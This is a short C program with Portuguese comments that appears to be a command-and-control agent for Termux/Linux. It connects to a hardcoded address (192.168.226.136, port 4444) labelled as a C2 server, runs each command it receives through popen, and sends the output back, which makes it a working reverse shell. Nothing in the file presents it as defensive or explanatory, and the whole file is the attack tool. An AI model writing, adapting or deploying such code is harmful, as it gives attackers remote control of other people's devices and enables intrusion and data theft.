#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];
    int recv_size;
    const char *ip = "192.168.226.136"; // IP do servidor Linux C2
    short port = 4444;
    char command[1024];

    // Cria o socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Falha ao criar socket");
        return 1;
    }

    // Define a estrutura do servidor
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Conecta ao servidor C2
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Falha ao conectar ao servidor");
        close(sock);
        return 1;
    }

    printf("Conectado ao servidor C2\n");

    // Loop para receber comandos e executá-los
    while ((recv_size = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[recv_size] = '\0'; // Garante que o buffer seja uma string válida
        printf("Comando recebido: %s\n", buffer);

        // Executa o comando recebido no Termux
        FILE *fp;
        fp = popen(buffer, "r"); // Executa o comando e obtém o resultado
        if (fp == NULL) {
            send(sock, "Falha ao executar comando", strlen("Falha ao executar comando"), 0);
            continue;
        }

        // Lê a saída do comando e envia de volta ao servidor
        while (fgets(command, sizeof(command), fp) != NULL) {
            send(sock, command, strlen(command), 0);
        }
        pclose(fp);

        // Envia mensagem de comando executado
        send(sock, "Comando executado", strlen("Comando executado"), 0);
    }

    close(sock);
    return 0;
}
